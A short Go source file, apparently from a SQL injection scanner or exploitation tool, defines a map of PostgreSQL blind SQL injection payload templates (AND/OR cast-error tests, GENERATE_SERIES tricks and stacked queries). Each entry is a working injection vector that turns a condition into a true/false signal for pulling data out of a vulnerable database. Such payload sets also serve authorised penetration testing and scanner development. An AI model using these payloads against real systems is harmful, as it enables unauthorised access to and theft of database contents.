package postgres

var B_Vectors = map[string]string {
	"and_cast": "%s AND (SELECT (CASE WHEN (%s) THEN NULL ELSE CAST((CHR(85)||CHR(77)||CHR(102)||CHR(102)) AS NUMERIC) END)) IS NULL%s",
	"or_cast": "%s OR (SELECT (CASE WHEN (%s) THEN NULL ELSE CAST((CHR(85)||CHR(77)||CHR(102)||CHR(102)) AS NUMERIC) END)) IS NULL%s",
	"series_rep": "%s(SELECT * FROM GENERATE_SERIES(6211,6211,CASE WHEN (%s) THEN 1 ELSE 0 END) LIMIT 1)%s",
	"stacked": "%s;SELECT (CASE WHEN (%s) THEN 8685 ELSE 1/(SELECT 0) END)%s",
	"series_stacked": "%s;SELECT * FROM GENERATE_SERIES(4162,4162,CASE WHEN (%s) THEN 1 ELSE 0 END) LIMIT 1%s",
}